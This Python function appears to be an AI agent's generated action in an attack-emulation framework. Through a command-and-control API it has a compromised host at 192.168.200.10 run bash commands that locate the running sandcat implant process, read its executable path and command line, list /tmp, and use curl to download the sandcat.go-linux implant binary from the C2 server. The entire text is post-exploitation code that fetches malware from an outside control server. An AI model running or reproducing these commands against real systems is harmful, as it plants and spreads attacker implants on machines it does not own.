async def query(
    environment_state_service,
    attack_graph_service,
):
    from incalmo.core.actions.LowLevel.run_bash_command import RunBashCommand
    
    # Use webserver-0 agent to check if sandcat binary can be obtained differently
    ws0_agent = None
    for agent in environment_state_service.get_agents():
        if '192.168.200.10' in agent.host_ip_addrs:
            ws0_agent = agent
            break
    
    c2api_client = environment_state_service.c2api_client
    c2c_server = environment_state_service.c2c_server
    
    # Check what the running sandcat agent binary is called and where it is
    action = RunBashCommand(ws0_agent, f'''
# Find the running sandcat process
ps aux | grep -i sandcat
ls -la /proc/$(pgrep -f sandcat)/exe 2>/dev/null
cat /proc/$(pgrep -f sandcat)/cmdline 2>/dev/null | tr "\\0" " "
# Check tmp files
ls -la /tmp/
# Try to get sandcat from C2 with correct headers
curl -s -o /tmp/sandcat.go-linux -H "file:sandcat.go-linux" "{c2c_server}/file/download" 
ls -la /tmp/sandcat.go-linux
''')
    result = c2api_client.send_command(action)
    return result
</query>
